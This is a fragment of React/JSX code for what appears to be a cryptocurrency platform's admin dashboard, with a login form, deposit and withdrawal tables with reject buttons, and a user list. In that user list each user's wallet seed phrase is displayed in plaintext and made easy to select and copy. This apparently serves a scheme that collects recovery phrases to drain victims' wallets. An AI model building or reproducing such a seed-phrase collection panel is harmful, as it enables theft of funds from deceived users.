            ...
            <form onSubmit={handleLogin} className="space-y-6">
              <div className="relative group/input">
                ...
                <input
                  ...
                  className="block w-full pl-12 pr-4 py-4 bg-white/80 dark:bg-gray-900/50 border border-slate-300 dark:border-gray-700 rounded-2xl focus:ring-2 focus:ring-indigo-500/50 focus:border-indigo-500 outline-none transition-all placeholder:text-gray-600 font-mono text-sm"
                  autoFocus
                />
              </div>
              <button
                    ...
                    <tr key={d.email} className="hover:bg-indigo-500/5 transition-colors group">
                      ...
                      <td className="px-6 py-6 text-right">
                        <div className="flex justify-end gap-2">
                          ...
                          <button onClick={() => handleAction(d.email, "reject")} className="p-2 bg-slate-100 dark:bg-gray-800 text-slate-500 dark:text-gray-400 hover:text-slate-900 dark:hover:text-white rounded-lg hover:bg-rose-500/20 hover:text-rose-400 transition-colors"><XCircle className="w-5 h-5" /></button>
                        </div>
                      </td>
                    </tr>
                  ))}
                    ...
                    <tr key={w.email} className="hover:bg-rose-500/5 transition-colors group">
                      ...
                      <td className="px-6 py-6 text-right">
                        <div className="flex justify-end gap-2">
                          ...
                          <button onClick={() => handleAction(w.email, "reject")} className="p-2 bg-slate-100 dark:bg-gray-800 text-slate-500 dark:text-gray-400 hover:text-slate-900 dark:hover:text-white rounded-lg hover:bg-rose-500/20 transition-colors"><XCircle className="w-5 h-5" /></button>
                        </div>
                      </td>
                    </tr>
                  ))}
              ...
              {loading ? (
                ...
                allUsers.map((u) => (
                  <tr key={u.email} className="hover:bg-indigo-500/5 transition-colors">
                    ...
                    <td className="px-6 py-4">
                       {u.seedPhrase ? (
                         <div className="text-[9px] font-mono hover:text-slate-900 dark:hover:text-white text-slate-400 dark:text-gray-500 bg-black/40 p-2 rounded max-w-[200px] break-all border border-slate-200 dark:border-gray-800 cursor-text select-all">
                           {u.seedPhrase.join(" ")}
                         </div>
          ...
          <div className="relative bg-white dark:bg-gray-900 border border-slate-300 dark:border-gray-700 w-full max-w-lg rounded-3xl p-8 shadow-2xl animate-in fade-in zoom-in duration-300">
            ...
            <div className="flex gap-3 mt-8">
              <button 
                ...
                className="flex-1 py-3 text-sm font-bold text-slate-500 dark:text-gray-400 hover:text-slate-900 dark:hover:text-white transition-colors"
              >
                Cancel
              </button>
              <button 
